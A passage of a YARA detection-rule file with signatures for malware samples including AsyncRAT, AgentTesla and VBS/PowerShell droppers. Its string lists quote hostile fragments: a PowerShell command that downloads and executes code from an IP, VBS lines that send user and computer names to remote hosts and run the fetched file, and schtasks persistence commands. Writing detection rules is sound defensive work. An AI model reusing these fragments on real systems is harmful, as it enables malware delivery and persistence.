      $s12 = "Pastebin" fullword wide /* score: '9.00'*/
      $s13 = "NVTQOdLlEeHNYxB" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__add2c17f {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_add2c17f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "add2c17fa43bb3c0249eee65ec1b6a0ff03b4075adbb72691b11208a48f3a912"
   strings:
      $s1 = "Spoofer.exe" fullword wide /* score: '27.00'*/
      $s2 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s3 = "zaQdUnDcCYfSN4Mqx2+HGq/4a5Py+YA1fzU0UOCokwcrP85kdqVNzPH6qr3wQzSrxwv+pEQ0j13iyyEFJNEPqMh4oodL1LpI7Mv51OrVcFyY8G72dv3DkFs3YrIOSTAu" wide /* score: '16.00'*/
      $s4 = "IsqOu3LiF5KqTtIx14evvFkA1Q3P+4H4cow+PRmdH94p+I6hM1THltaGOmFdcY3z6/kzGJEkNSfIPhpEC5UCs0bQ5etUbW2fBZ0Hv70pr1D9gUQNjPFetRKESXu0SRgr" wide /* score: '15.00'*/
      $s5 = "WVlVVE0xWE9Tb3BGOGpTVXpmRmphQzE4cmE5WlJBMGQ=" fullword wide /* base64 encoded string 'YYUTM1XOSopF8jSUzfFjaC18ra9ZRA0d' */ /* score: '14.00'*/
      $s6 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s7 = "Spoofer" fullword wide /* score: '11.00'*/
      $s8 = "Pastebin" fullword wide /* score: '9.00'*/
      $s9 = "HYsilXER1JsBj+JCRP0W1E1I0dK7sEa7/UdLLEqo9I438rvl5F7Aabn8+286HGM06xPt8BCsf4nKBy9noDMEsQ==" fullword wide /* score: '9.00'*/
      $s10 = "A hwid Spoofer" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bf139e8d {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bf139e8d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf139e8d4cc73239afcbbac7591c0fd609d2ca358ff2c4aedf991ad08f1bbe12"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /ru system /rl highest /tn " fullword wide /* score: '26.00'*/
      $s2 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s3 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s4 = "AsyncClient.exe" fullword ascii /* score: '22.00'*/
      $s5 = "avera.exe" fullword wide /* score: '22.00'*/
      $s6 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s7 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s8 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s9 = "ektHMmQ0U3pzUkVheEFsS0ZCbXU1Mm40ZVA3Y0JFUG4=" fullword wide /* base64 encoded string 'zKG2d4SzsREaxAlKFBmu52n4eP7cBEPn' */ /* score: '14.00'*/
      $s10 = "DKS1OGtjsnKjYk7s6KNC1/CNOdCswajIDG/HgfYssrLxg+hy+zBdyvFYl+KFLUik+VVcGTWYLQf1e7qXeyjJavgthNerdcQBizgz6+GMZhXsShSCak/TiJg8NZIs9jpt" wide /* score: '14.00'*/
      $s11 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s12 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s13 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s14 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s15 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c2e36807 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c2e36807.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c2e368072e9b1860bed983019953e1bf37e1347527537ac372ce75e198f67a37"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s3 = "16Client.exe" fullword ascii /* score: '22.00'*/
      $s4 = "Windows Audio.exe" fullword wide /* score: '19.00'*/
      $s5 = "uGUuA8U4eKnRWPwbaU5M5ormiuy+9+gDS2nDwbOjzv83bYtPEQt8UwjUxVRfMnmMgocZY2aUi/Slt9EhAlCXwxKDEzcbJchUlaImb5gTg8iHRpV0GHsho5OCMfIV27+o" wide /* score: '16.00'*/
      $s6 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s7 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s8 = "WFZyTUpKVDM3UGNGZjF4Rjl1NVlZdGNrR0tYU1V3NGM=" fullword wide /* base64 encoded string 'XVrMJJT37PcFf1xF9u5YYtckGKXSUw4c' */ /* score: '14.00'*/
      $s9 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s10 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s11 = "LH4oxONk2ZWDKIsNigoaMpozdDMmPGhdS6Fp1s877UMqr87PqepqZ508jSkZB4+ttIKSoKqu3ML6GmzC8RKRrYIbFsJHMzZoGn8VReNA4r0jgkcupIb+99gFjKydvRXy" wide /* score: '11.00'*/
      $s12 = "GetAsUInt64" fullword ascii /* score: '10.00'*/
      $s13 = "_authKey" fullword ascii /* score: '10.00'*/
      $s14 = "Client.Connection" fullword ascii /* score: '10.00'*/
      $s15 = "AuthKeyLength" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__dfd94151 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_dfd94151.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dfd94151544cfefdfdfc52c9904e295d76d3240b4f6b77728e45096e84da4339"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s3 = "AsyncClient.exe" fullword ascii /* score: '22.00'*/
      $s4 = "ICANT.exe" fullword wide /* score: '18.00'*/
      $s5 = "CloseMutex" fullword ascii /* score: '15.00'*/
      $s6 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s7 = "MUNGMW9xbHZSZmxBS0puVUw3NEY5c1diQUMxUkVOYng=" fullword wide /* base64 encoded string '1CF1oqlvRflAKJnUL74F9sWbAC1RENbx' */ /* score: '14.00'*/
      $s8 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s9 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s10 = "GetAsUInt64" fullword ascii /* score: '10.00'*/
      $s11 = "_authKey" fullword ascii /* score: '10.00'*/
      $s12 = "Client.Connection" fullword ascii /* score: '10.00'*/
      $s13 = "AuthKeyLength" fullword ascii /* score: '10.00'*/
      $s14 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s15 = "p4ojtZzZZfGbE2QdbaffU0SV+2f6qBJg/wujHmHEHH9pAMF9sJM+Q0EhVcZeR2TK2fY+Shl4uI6E1VPC6oTdKN0uX/kdErMe9VIWlZLDmlCLCwr4ULVLQR7jFjSBxXjo" wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule AtlasAgent_signature__a4b7fa668a72d61d6d0f03a3081a03c8_imphash_ {
   meta:
      description = "_subset_batch - file AtlasAgent(signature)_a4b7fa668a72d61d6d0f03a3081a03c8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8a9e5f8d5aadae72f01192ef172c704460a6f4c5eeff545d23d6c19327b9171"
   strings:
      $s1 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s2 = "Project3.exe" fullword ascii /* score: '22.00'*/
      $s3 = "WebSys.exe" fullword wide /* score: '22.00'*/
      $s4 = "_BypassCFG@0" fullword ascii /* score: '15.00'*/
      $s5 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s6 = "Replace Template" fullword wide /* score: '11.00'*/
      $s7 = "Share Framework" fullword wide /* score: '10.00'*/
      $s8 = "&nanoservice failure: 202504261340 UTC" fullword wide /* score: '10.00'*/
      $s9 = "- -Pny" fullword ascii /* score: '9.00'*/
      $s10 = "d- -wD" fullword ascii /* score: '9.00'*/
      $s11 = "parallelized memory management subsystem" fullword wide /* score: '9.00'*/
      $s12 = "Lock Log" fullword wide /* score: '9.00'*/
      $s13 = "Publish Connection" fullword wide /* score: '9.00'*/
      $s14 = "[16:40:56.823] Kernel: soap" fullword wide /* score: '9.00'*/
      $s15 = " vhgP;!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule a0a9aed8146e0511299e3e05fc29c81e1a8e70cf65a31b3e0fd827e1c7352972_a0a9aed8 {
   meta:
      description = "_subset_batch - file a0a9aed8146e0511299e3e05fc29c81e1a8e70cf65a31b3e0fd827e1c7352972_a0a9aed8.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a0a9aed8146e0511299e3e05fc29c81e1a8e70cf65a31b3e0fd827e1c7352972"
   strings:
      $x1 = "powershell.exe iex(iwr -useb http://192.168.45.231/AllInOne.css).Content" fullword ascii /* score: '36.00'*/
      $s2 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Microsoft " wide /* score: '28.00'*/
      $s3 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s4 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#Visual" wide /* score: '24.00'*/
      $s5 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide /* score: '21.00'*/
      $s6 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files\\Microsoft Office\\root\\Office16\\MSWORD.OLB#Microsoft Word " wide /* score: '16.00'*/
      $s7 = "Win32_Process" fullword ascii /* score: '15.00'*/
      $s8 = "<a:clrMap xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" bg1=\"lt1\" tx1=\"dk1\" bg2=\"lt2\" tx2=\"dk2\" acce" ascii /* score: '10.00'*/
      $s9 = "[Host ExtendP" fullword ascii /* score: '9.00'*/
      $s10 = "GetObjectz" fullword ascii /* score: '9.00'*/
      $s11 = "winmgmts" fullword ascii /* score: '8.00'*/
      $s12 = "\\System3" fullword ascii /* score: '8.00'*/
      $s13 = "omation" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6b76abca {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6b76abca.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b76abca8f35fff263c12beaaf521405a1d3743abde3bc20d8415272b2c5a140"
   strings:
      $s1 = "ekqD.exe" fullword wide /* score: '22.00'*/
      $s2 = "ekqD.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Export Complete" fullword wide /* score: '12.00'*/
      $s4 = "E@@@@@@" fullword ascii /* reversed goodware string '@@@@@@E' */ /* score: '11.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "PatternGenerator.Forms.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s7 = "NIQ@!!!" fullword ascii /* score: '10.00'*/
      $s8 = "Error exporting pattern: " fullword wide /* score: '10.00'*/
      $s9 = "GetQualityValue" fullword ascii /* score: '9.00'*/
      $s10 = "GetImageFormat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule sig_9d639da5188307d31519ffa5b61acd014663aff59b4ef7e57193bd42058fef6b_9d639da5 {
   meta:
      description = "_subset_batch - file 9d639da5188307d31519ffa5b61acd014663aff59b4ef7e57193bd42058fef6b_9d639da5.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9d639da5188307d31519ffa5b61acd014663aff59b4ef7e57193bd42058fef6b"
   strings:
      $s1 = "lswDlL[B" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5f00 and filesize < 3000KB and
      all of them
}

rule sig_9da10e3b1fc6637ac397b9e18df413926f420b986f93d56edd9b2a06ef8ffd5e_9da10e3b {
   meta:
      description = "_subset_batch - file 9da10e3b1fc6637ac397b9e18df413926f420b986f93d56edd9b2a06ef8ffd5e_9da10e3b.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9da10e3b1fc6637ac397b9e18df413926f420b986f93d56edd9b2a06ef8ffd5e"
   strings:
      $s1 = "url_array(1) = \"http://199.103.56.165/ORD-ALL/\" & userName & separ & computerName & \"/ORD-2020.txt\" " fullword ascii /* score: '25.00'*/
      $s2 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '23.00'*/
      $s3 = "url_array(0) = \"http://www.comunesanlorenzonuovo.it/ORD-2020.txt\" " fullword ascii /* score: '17.00'*/
      $s4 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s5 = "url_array(2) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/ORD-2020.txt\" " fullword ascii /* score: '17.00'*/
      $s6 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '16.00'*/
      $s7 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s8 = "WScript.Sleep 120000" fullword ascii /* score: '13.00'*/
      $s9 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s10 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s11 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s12 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s13 = "Const scriptVer  = \"1.0\" " fullword ascii /* score: '10.00'*/
      $s14 = "Dim fso , LOG_FILE_2 , file_to_delete " fullword ascii /* score: '9.00'*/
      $s15 = "Set oShell =  Nothing" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 5KB and
      8 of them
}

rule a325c142bf4d46f1fb5ace66898353ed77bfae3740bbdf5c2f92184dc1adc18b_a325c142 {
   meta:
      description = "_subset_batch - file a325c142bf4d46f1fb5ace66898353ed77bfae3740bbdf5c2f92184dc1adc18b_a325c142.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a325c142bf4d46f1fb5ace66898353ed77bfae3740bbdf5c2f92184dc1adc18b"
   strings:
      $s1 = "Const LocalFile = \"C:\\Users\\Public\\Libraries\\ORDINE.exe\" " fullword ascii /* score: '30.00'*/
      $s2 = "url_array(3) = \"http://199.103.56.165/ORDINI/\" & userName & separ & computerName & \"/ORDINE.txt\" " fullword ascii /* score: '25.00'*/
      $s3 = "url_array(1) = \"http://138.201.207.87/ORDINI/\" & userName & separ & computerName & \"/ORDINE.txt\" " fullword ascii /* score: '25.00'*/
      $s4 = "If get_file( a ) =  True then oShell.exec  LocalFile" fullword ascii /* score: '22.00'*/
      $s5 = "url_array(0) = \"http://138.201.207.87/ORDINI/ORDINE.txt\" " fullword ascii /* score: '19.00'*/
      $s6 = "url_array(2) = \"http://199.103.56.165/ORDINI/ORDINE.txt\" " fullword ascii /* score: '19.00'*/
      $s7 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s8 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s9 = "WScript.Sleep 1200" fullword ascii /* score: '13.00'*/
      $s10 = "WScript.Sleep 5000" fullword ascii /* score: '13.00'*/
      $s11 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s12 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s13 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s14 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s15 = "Const scriptVer  = \"1.0\" " fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 5KB and
      8 of them
}

rule aab6c40e95897001ffa918cc6b5380287327a2762de4b42b77642171c27e0b45_aab6c40e {
   meta:
      description = "_subset_batch - file aab6c40e95897001ffa918cc6b5380287327a2762de4b42b77642171c27e0b45_aab6c40e.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aab6c40e95897001ffa918cc6b5380287327a2762de4b42b77642171c27e0b45"
   strings:
      $x1 = "Const LocalFile = \"C:\\Users\\eleonora_gandellini\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ORDINI." ascii /* score: '37.00'*/
      $s2 = "url_array(1) = \"http://199.103.56.165/ORD-ALL/\" & userName & separ & computerName & \"/ORD-2020.txt\" " fullword ascii /* score: '25.00'*/
      $s3 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '23.00'*/
      $s4 = "oShell.exec LocalFile " fullword ascii /* score: '20.00'*/
      $s5 = "url_array(0) = \"http://199.103.56.165/ORD-2020.txt\" " fullword ascii /* score: '19.00'*/
      $s6 = "set oShellEnv = oShell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s7 = "url_array(2) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/ORD-2020.txt\" " fullword ascii /* score: '17.00'*/
      $s8 = "url_array(3) = \"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\" & userName & separ & computerName & \"/ORD-202" ascii /* score: '16.00'*/
      $s9 = "Dim oShell , separ , comp , computerName , userName , oShellEnv , a" fullword ascii /* score: '15.00'*/
      $s10 = "WScript.Sleep wait1" fullword ascii /* score: '13.00'*/
      $s11 = "computerName  = oShellEnv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s12 = "  xmlhttp.Open \"GET\", strURL, False " fullword ascii /* score: '12.00'*/
      $s13 = "userName  = oShellEnv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s14 = "Set oShell = CreateObject( \"WScript.Shell\" )" fullword ascii /* score: '12.00'*/
      $s15 = "'WScript.Sleep wait1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule AgentTesla_signature__ae512364 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_ae512364.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae512364ca221abf4b2ce4ab7b865bdab8eb224fcdcd443e4a292370d94e9892"
   strings:
      $s1 = " a Command Prompt or blocker Start Menu by running: notepad %systemroot%\\system32\\sppui\\phone.inf\"" fullword ascii /* score: '29.00'*/
      $s2 = "Set frogshell = county.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '28.00'*/
      $s3 = "private const vositmajugh             = \"This command of SLMgr.vbs is not supported for remote execution\"" fullword ascii /* score: '25.00'*/
      $s4 = "Set dinos = county.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s5 = "private const syaugbkfso                             = \"Usage: slmgr.vbs [MachineName [User Password]] [<Option>]\"" fullword ascii /* score: '22.00'*/
      $s6 = "private const hwodksymfu        = \"Processing blocker license for %PRODUCTDESCRIPTION% (%PRODUCTID%).\"" fullword ascii /* score: '20.00'*/
      $s7 = "private const jmueibhlz                       = \"Product raceways telephone numbers can be obtained by searching blocker phone." ascii /* score: '20.00'*/
      $s8 = "private const aknhetapicgz     = \"This system is configured for Token-based raceways only. Use slmgr.vbs /fta tossers initiate " ascii /* score: '19.00'*/
      $s9 = "private const aknhetapicgz     = \"This system is configured for Token-based raceways only. Use slmgr.vbs /fta tossers initiate " ascii /* score: '19.00'*/
      $s10 = "private const vdxbsyn                        = \"On a computer running Microsoft Windows non-core edition, run 'slui.exe 0x2a 0x" ascii /* score: '19.00'*/
      $s11 = "        & ToHex(malacophilous) & \"\\\" & merdurinous.GetBaseName(WScript.ScriptName) &  \".ini\"" fullword ascii /* score: '17.00'*/
      $s12 = "private const evobmbpdp    = \"Warning: This operation may affect more than one target license.  Please verify blocker results." ascii /* score: '17.00'*/
      $s13 = "private const rbgynxec                     = \"Access denied: blocker requested action requires elevated privileges\"" fullword ascii /* score: '17.00'*/
      $s14 = "    FailRemoteExec()" fullword ascii /* score: '17.00'*/
      $s15 = "private const htxdsmilgi                            = \"Access denied: blocker requested action requires elevated privileges\"" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x0d27 and filesize < 400KB and
      8 of them
}

rule a47c2fa179db4681570f301386d1bdf2fc6cf3120bc722c8e18443c4b1d5b3c9_a47c2fa1 {
   meta:
      description = "_subset_batch - file a47c2fa179db4681570f301386d1bdf2fc6cf3120bc722c8e18443c4b1d5b3c9_a47c2fa1.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a47c2fa179db4681570f301386d1bdf2fc6cf3120bc722c8e18443c4b1d5b3c9"
   strings:
      $s1 = ";metsyS gnisu" fullword ascii /* reversed goodware string 'using System;' */ /* score: '14.00'*/
      $s2 = "bYZEXEHkp+Hkp.REROLPXE - NOITCEJNI EDOCLLEtJP+tJPHSbYHkp+HkpZ tsoH-etirW" fullword ascii /* score: '12.00'*/
      $s3 = "{ hctac" fullword ascii /* reversed goodware string 'catch {' */ /* score: '11.00'*/
      $s4 = "ht3I1 f-48D'+'}49{}931{}8{}26{}2{}701{}6{}42{}37'+'{}92{}76'+'{}401{'+'}38Hkp+'+'Hkp{}81{}141{}57{}211{Hkp+Hkp}901{}19{}011{}051" ascii /* score: '9.00'*/
      $s5 = "oHkp+HkplEFtHkp)) tbW & ( NJVshellid[1]+NJVS'+'HElLid[13]+HkpX'+'Hkp)').REPLaCe(([ChAR]116+[ChAR]98+[ChAR]87),[sTRINg][ChAR]124)" ascii /* score: '9.00'*/
      $s6 = "Hkp+Hkp,eziSn tniu tJP+tJ3I1,3I1+tJ'+'PmaNssecorP- ntJP+tJPoitcejnKZB+KZBIHkp+HkpKZB+KZBedoHkp+HkpcllehS-ekovnI KZB+3I1,'+'3I1rC" ascii /* score: '8.00'*/
      $s7 = "3I1'+',3I1tJPitinifeDepyT- epyT-ddAKZB(Hkp+Hkp(( XEI tJP(3I1,3I1+KZBCZ2 emaNKZB+tJP+tJPK'+'ZB- ssecorP-teKZB+KZBHkp+HkpG tJP+tJP" ascii /* score: '8.00'*/
      $s8 = "bYZ!gn'+'o3I1,3I1[ qe- daerhThCtJP+t3I1Hkp+Hkp,3I1neptJP'+'+tJPO::]noitc3I1,3I1  " fullword ascii /* score: '8.00'*/
      $s9 = "{ Hkp+Hkp)1'+' tl- '+'htgn'+'eL.sgraCZ2( fi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2620 and filesize < 40KB and
      all of them
}

rule a31a2f07410329f169978c373a273cb2d181d8dbab4102e55899b59e92ec46f6_a31a2f07 {
   meta:
      description = "_subset_batch - file a31a2f07410329f169978c373a273cb2d181d8dbab4102e55899b59e92ec46f6_a31a2f07.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a31a2f07410329f169978c373a273cb2d181d8dbab4102e55899b59e92ec46f6"
   strings:
      $x1 = "OGNpMa5wYZaKqWUaXLhCEx0Ay6gvUPWUoYwq6sYXk5lcdJmmkKnj46UpYad0Uc8r8MC5Sem6GtKwXygOxbINpmgc2bBWSEnHWEWK2ygvFVi5DY6hJgYu9zVoZhkF1HR3" ascii /* score: '63.00'*/
      $s2 = "7SoWAMAbrljgTcKgIrcwR3anr0EXnvYXEdhan1Ubqu4TizqFPBjSL1doQW14SB3DdDekO3yRWCBBT8K6tebxXNloGTouRi0oTi2mbUTQ3ATbM3iWspdDf9s5XNyqQXId" ascii /* score: '21.00'*/
      $s3 = "qjaLHLCW1TzpK9T2wvYnvQvJj6oEYEuirCdxF1TgV7o9zGlE8xVnLrbQzZmDpetxXv5YXxGZ4mmGX0Qa52afQYjPtK7OoEh12TOtoATTq1JxbQLPvgCBoXEXbuCX8yDA" ascii /* score: '21.00'*/
      $s4 = "t8hzL5BvjgS98QdgephsD0vAaLftpcCUiB0ojVDpzzGWgstxbdLlyMniYf4cvZaV5rcyJZdpCh62zLOmAq0tIMzU2fhta3fh8jvFlHLDVMNWgq2QU042n2RnDrxVU5LN" ascii /* score: '21.00'*/
      $s5 = "9FeJwh5rwxvvN6N5TIaMGGvof2sPpzrAh7SbrXwJXDrt5452OAzzoGrAEYezLiw6I84kTTfNbOKX3YX2QytMPPcFoGAcvTDj4qtXSaCJG0jcuZcMjDjFhj8Mafo6EGaK" ascii /* score: '19.00'*/
      $s6 = "miILyBwWNTsVGVuEvGg1RGCDpLS8HiR6nALw1cvXGtMpuf4owrx3l0tGJ9PCMkcn61Rc0R3QqSd44aDhJcy5M9gI3NLYk3DRqozBcfEQIi50NIFAD4AttiSbEYe18fAI" ascii /* score: '19.00'*/
      $s7 = "SvugOYx1CzK4kOAkRQypxq4eNEJyUz36OcHJLG8VjTb1XATspwV6cZtLvn0q7JJWV4ZP7jJCqUXGg4egRyeiQ2fOc9XOxIsHvqCkOyPPfZXas8aRS6rU4JJ5dqLPexec" ascii /* score: '19.00'*/
      $s8 = "r3SDLAh57p0TLM3dA6MIaxpBR8IwoDeKbNvVHuok6yIMGhhjeJpnXkObkQoKuA4H7axOgVYlHmsgCHqd0AWlIRYWpdnWptPgZExeC1qPom8Cm9NbMEt1U2CDqIgJFQbn" ascii /* score: '19.00'*/
      $s9 = "3TEmp6mAzyL8Icxy040phTgPJlirWiKrJEN4lpukCPmdRHb5SP3V6wDxI1I1Hgf2DGxL2oZ3UsMuTZcMdmF3AgCMvZFNjop0w6MMJ4dN0uVl1Wt6hiyEYiZuNxwgY6h4" ascii /* score: '18.00'*/
      $s10 = "GACmDsbBOJeMEzFp8WDZK2dXu2ffDKOuNK7j9bmd0YdAQXEyV4cEnJmGLvMS40cQHObHZBbRoSuObLhujHGN3TVTZjY4kSnM7t2D5gxszYrpSRYvygamkYiSizdGuio0" ascii /* score: '18.00'*/
      $s11 = "7TcWvt9ohl6WDhDjAK5y5temPvqdmHb4dT0526pmlf7FdZFh2M4rqIPdQ5hyzu01AdCVrSOMHUfeIw1i1IZUep0ESQINGXcftUbX2wkoOj8VrqQ3Hfyd8XLrgT0dHEJH" ascii /* score: '18.00'*/
      $s12 = "Phh1KzrdQC2tTlWFG7TUOKOVLhl4px52LO2i2QuVjMKpIPEBCx2eN38PEEWk4To6ZUQWiE4FkfOgcovRVwMndBxJOCFjdGx6FVHCzQI7bfdE5zVFKdqhqjnT07MnBMRJ" ascii /* score: '17.00'*/
      $s13 = "ZuweDuMPF9nkRAIx20DCbml95RgyAlAMpf5wAdVzTaEFbpw4TKGs0FIh4hG9vkVWkhfCRc9Il3oWc7xMehSP4zI6hFCUNrfVTX4DhsDcH5xOB5E6ieBbR1ee9duoCAXZ" ascii /* score: '17.00'*/
      $s14 = "jCkDeGMDKTJwjgYlrowRSKflE0vT4yrKeyrbJrtd3NIkwBgQe6AeGbmZPgFOZisUbtmpfaJeECpEOCY8YIsb61j7cWJM8U5KkUthOSWX0SH9lj4BivV4dcQh05WBRJN8" ascii /* score: '17.00'*/
